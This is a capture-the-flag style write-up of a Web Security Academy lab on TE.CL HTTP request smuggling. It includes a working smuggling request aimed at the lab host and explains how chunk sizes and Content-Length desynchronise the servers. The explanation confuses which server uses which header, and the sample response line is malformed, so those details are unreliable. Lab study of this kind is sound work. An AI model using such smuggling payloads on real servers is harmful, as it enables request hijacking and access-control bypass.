## 1. Introduction

This vulnerability is when the frontend uses the Transfer-Encoding header and the backend server uses the Content-Length header.

So, this means that the frontend server processes the TL using chunked encoding and determines the size of the body, while the backend processes the CL.
## 2. Challenge

Backend doesn't support chunked encoding, and rejects requests that aren't using GET or POST.

Smuggle a request to the backend server, so the next request processed by the backend appears to use the method GPOST.

## 3. Solution

Attack request:
```http
POST / HTTP/1.1
Host: 0aef00ce04274d208252ec7a00c1003c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```

Normal request:
```http
POST / HTTP/1.1
Host: 0aef00ce04274d208252ec7a00c1003c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

foo=bar
```

The response is:
```http
POST / HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```

## 4. Explanation
First the attack request is sent, and since it uses TE, we must include the number of bytes (hex) for the body.

```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
```

This chunk has 56(hex) bytes, so the backend will forward this as body to the backend, and the 0 in the end tells the end of the chunks to be sent.

But when the request goes to the backend, which uses Content-Length, the situation is different.

There we have the Content-Length to be 4, which means that only "56" will be processed in the request, and the remaining part:

```http
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0
```

will be left for the next request.

Here, the Content-Length has been set to 6, even though the real content length is 5, because it needs to tell the backend that it should have additional data.

This is needed so when we send the next request "normal request", at least something will be appended and the method will be GPOST.